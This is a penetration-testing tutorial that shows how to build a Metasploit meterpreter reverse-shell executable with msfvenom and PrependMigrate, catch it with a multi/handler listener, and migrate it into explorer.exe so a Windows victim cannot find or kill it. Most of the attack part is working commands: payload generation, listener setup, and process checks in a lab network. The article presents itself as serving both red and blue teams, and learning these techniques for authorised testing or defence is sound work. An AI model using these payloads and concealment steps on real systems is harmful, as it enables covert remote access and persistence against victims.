<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Hiding Shell using PrependMigrate -Metasploit</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hiding-shell-using-prependmigrate-metasploit/" rel="bookmark"><time class="entry-date published" datetime="2019-12-13T13:07:21+00:00">December 13, 2019</time><time class="updated" datetime="2025-05-12T21:17:40+00:00">May 12, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">In this article, you will get to know about the strength of mfsvenom along with PrependMigrate. You will also learn how to migrate the created payload into processes currently running on the targeted machine so, the victim unable to find the malicious file. It is very important to migrate your backdoor payload because if the target is alerted and decides to take measures to kill the process then, your session will also get killed. Therefore, an attacker must do this as soon as the session opens.</span></p>
<h3><span style="color: #800000;"><strong>Table of Content</strong></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Basic Terminologies</strong></span>
<ul>
<li><span style="color: #000000;">Metasploit Framework</span></li>
<li><span style="color: #000000;">MSFvenom</span></li>
<li><span style="color: #000000;">PrependMigrate</span></li>
</ul>
</li>
<li><span style="color: #000000;"><strong>Hiding shell with PrependMigrate</strong></span>
<ul>
<li><span style="color: #000000;">With MSFvenom.</span></li>
<li><span style="color: #000000;">Without MSFvenom.</span></li>
</ul>
</li>
</ul>
<p><span style="color: #000000;"><strong>Basic Terminologies</strong></span></p>
<p><span style="color: #000000;"><strong>Metasploit Framework</strong></span></p>
<p><span style="color: #000000;"><a style="color: #000000;" href="https://en.wikipedia.org/wiki/Metasploit_Project#Metasploit_Framework">Metasploit Framework</a>, an open-source tool for developing and executing exploit code against a remote target machine.</span></p>
<p><span style="color: #000000;"><strong>Steps for exploiting a system using the Framework include:</strong></span></p>
<ul>
<li><span style="color: #000000;">Choosing and configuring an exploit</span></li>
<li><span style="color: #000000;">Checking whether the intended target system is susceptible to the chosen exploit</span></li>
<li><span style="color: #000000;">Choosing and configuring a payload</span></li>
<li><span style="color: #000000;">Choosing the encoding technique</span></li>
<li><span style="color: #000000;">Executing the exploit.</span></li>
</ul>
<p><span style="color: #000000;">This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploits writers, and payload writers. </span></p>
<h3><span style="color: #800000;"><strong>Msfvenom </strong></span></h3>
<p><span style="color: #000000;">MSFvenom is a combination of Msfpayload and Msfencode, putting both of these tools into a single Framework instance. It is used to generate and encode various types of payload that are available in the Metasploit Framework. The advantages of msfvenom are:</span></p>
<ul>
<li><span style="color: #000000;">One single tool</span></li>
<li><span style="color: #000000;">Standardized command-line options</span></li>
<li><span style="color: #000000;">Increased speed</span></li>
</ul>
<h3><span style="color: #800000;"><strong>PrependMigrate</strong></span></h3>
<p><span style="color: #000000;">PrependMigrate is an option that allows us to link our session with an ongoing process on the target system. It can also transfer a session by linking it from one process to another. It comes handy as it is difficult for the target to find the malicious process so it becomes paramount for the attacker to cover their tracks.</span></p>
<p><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker:</strong></span></p>
<p><span style="color: #000000;">    OS: Kali Linux</span></p>
<p><span style="color: #000000;">    IP: 192.168.1.107</span></p>
<p><span style="color: #000000;"><strong>Target:</strong></span></p>
<p><span style="color: #000000;"><strong>      </strong>OS: Windows 10</span></p>
<p><span style="color: #000000;">      IP: 192.168.1.104</span></p>
<h3><span style="color: #800000;"><strong>First Method</strong></span></h3>
<p><span style="color: #000000;">Let’s start the game of conceal and seek. You have to conceal to save yourself and let the target try to find you.</span></p>
<p><span style="color: #000000;">Starting with MSFvenom we will be creating a malicious executable named raj.exe and conceal the generated executable behind a process named explorer.exe (you can choose any process running on task manager) by PrependMigrate process.</span></p>
<pre class="lang:default decode:true  ">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.107 lport=1234 prpendmigrateprocess=explorer.exe prependmigrate=true -f exe &gt; raj.exe</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6CpBwEk3xNc/XfOLOtwnyPI/AAAAAAAAh60/7mZOyDtFHrwZlWE0dE633_68WNwZSa_nQCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Next, we will be loading the Metasploit framework on Kali Linux by using the<strong> msfconsole</strong> keyword<strong>. </strong>Then set the following options to enable our handler:</span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.107
set lport 1234
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-h9ZXYpvvKPg/XfOLO_vnRBI/AAAAAAAAh64/PEBQ4C_XM0YjhynvneZwcw8hvu5q5npzgCLcBGAsYHQ/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now, we will send the payload to the target machine and run the executable on the Target Machine. This will generate a meterpreter session which will be captured by the listener we created earlier. You can access the target system but if the target acknowledges that the system is compromised; then they can take security measures to end your session. To escape from this situation, the attacker’s first responsibility is to conceal the executable payload behind the process so the victim cannot identify it in any way possible.</span></p>
<p><span style="color: #000000;">Use the following ps command to check the processes that are running presently and filter with the raj.exe</span></p>
<pre class="lang:default decode:true">ps|grep raj.exe</pre>
<p><span style="color: #000000;"> The process ID (PID) of raj.exe i.e. 4848 as shown in the process list and if the victim kills the raj.exe i.e. 4848 PID then the running process will end. Thus, ending our session with a simple command:</span></p>
<pre class="lang:default decode:true">kill 4848</pre>
<p><span style="color: #000000;">But you do not need to worry as PrependMigrate saves the day by letting us conceal raj.exe behind the explorer.exe and you will be at an advantage as your meterpreter session is still running. </span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5BUAeDy657w/XfOLO8XKmJI/AAAAAAAAh68/oxopDraIQQAby2N_khsiNMewVsi0w_VXgCLcBGAsYHQ/s1600/3.png"/></span></p>
<h3><span style="color: #800000;"><strong>Second Method</strong></span></h3>
<p><span style="color: #000000;">The Second way of hiding shells using the PrependMigrate but without using msfvenom. Here, the objective is the same as the earlier. We will start by opening the Metasploit Framework.</span></p>
<p><span style="color: #000000;">Then use the following set of commands to create your payload:</span></p>
<pre class="lang:default decode:true">use windows/meterpreter/reverse_tcp
set lhost 192.168.1.107
set lport 4444
set prependmigrate true
set prependmigrateprocess explorer.exe
generate –f.exe - o nisha.exe</pre>
<p><img decoding="async" style="color: #000000;" src="https://1.bp.blogspot.com/-QrjDOtPPbug/XfOLPlbMFfI/AAAAAAAAh7A/U9rUpKavFo0Mk5uPcrDjiEmFWudCrxN3QCLcBGAsYHQ/s1600/4.png"/></p>
<p><span style="color: #000000;">After the creation of malicious executable i.e. nisha.exe, we will create listener multi/handler using the following commands:</span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.107
set lport 4444
exploit</pre>
<p><span style="color: #000000;">Using the ps command along with grep command we will get the PID of nisha .exe i.e.4128</span></p>
<pre class="lang:default decode:true">ps|grep nisha.exe</pre>
<p><span style="color: #000000;">(Note: PID stands for process id, which means the identification number for currently running process in memory. PPID stands for Parent Process Id, which means the parent process is responsible for creating the child (current) process. Through parent Process, the child process will be created.)</span></p>
<p><span style="color: #000000;">Now we try ourselves to kill the nisha.exe process to get conceal from the victim with the following command:</span></p>
<pre class="lang:default decode:true ">kill 4128</pre>
<p><span style="color: #000000;">But still, you have a victim’s session which means nisha.exe migrates into new process id of explorer.exe. And you can use the sysinfo command to confirm that the session is still up and running.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Iqr4prmpfeo/XfOLP14OMlI/AAAAAAAAh7E/GKxr26vAK50NBK6efhSjpVftIZbLAC4rgCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;"><strong>Conclusion</strong></span></p>
<p><span style="color: #000000;">This is how one conceals themselves. The purpose of this article is to serve both the blue team and the red team as one should be aware of how to locate and eliminate the attacker as well as how to conceal yourself when you are on the other side of the line.</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Nisha Sharma is trained in Certified Ethical hacking and Bug Bounty Hunter. Connect with her <a style="color: #000000;" href="https://www.linkedin.com/in/nishasharmaa"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-related-none yarpp-template-thumbnails">
